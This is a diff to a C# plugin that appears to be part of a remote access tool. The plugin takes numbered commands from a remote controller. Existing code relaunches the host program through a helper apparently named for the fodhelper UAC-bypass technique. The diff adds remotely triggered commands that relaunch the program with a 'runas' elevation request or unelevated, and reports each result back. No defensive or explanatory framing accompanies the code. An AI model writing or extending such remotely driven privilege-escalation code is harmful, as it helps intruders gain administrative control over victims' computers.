@@ -1,5 +1,7 @@
 ﻿using System;
 using System.Collections.Generic;
+using System.Diagnostics;
+using System.IO;
 using System.Linq;
 using System.Text;
 using System.Threading.Tasks;
@@ -48,7 +50,7 @@ namespace Plugin
                         await node.SendAsync(new byte[] { 0 });
                     }
                 }
-                else if (data[0] == 3) 
+                else if (data[0] == 3)
                 {
                     string path = System.Reflection.Assembly.GetEntryAssembly().Location;
                     if (await FodHelper.Run($"\"{path}\""))
@@ -60,11 +62,41 @@ namespace Plugin
                         await node.SendAsync(new byte[] { 0 });
                     }
                 }
+                else if (data[0] == 4)
+                {
+                    using (Process configTool = new Process())
+                    {
+                        try
+                        {
+                            configTool.StartInfo.FileName = System.Reflection.Assembly.GetEntryAssembly().Location;
+                            configTool.StartInfo.Verb = "runas";
+                            configTool.Start();
+                            await node.SendAsync(new byte[] { 1 });
+                        }
+                        catch
+                        {
+                            await node.SendAsync(new byte[] { 0 });
+                        }
+                    }
+                }
+                else if (data[0] == 5)
+                {
+                    try
+                    {
+                        SystemUtility.ExecuteProcessUnElevated(System.Reflection.Assembly.GetEntryAssembly().Location,"", Directory.GetCurrentDirectory());
+                        await node.SendAsync(new byte[] { 1 });
+                    }
+                    catch 
+                    {
+                        await node.SendAsync(new byte[] { 0 });
+                    }
+                }
                 await Task.Delay(1000);
             }
             catch 
             {
                 await node.SendAsync(new byte[] { 0 });
+                await Task.Delay(1000);
             }
         }
     }
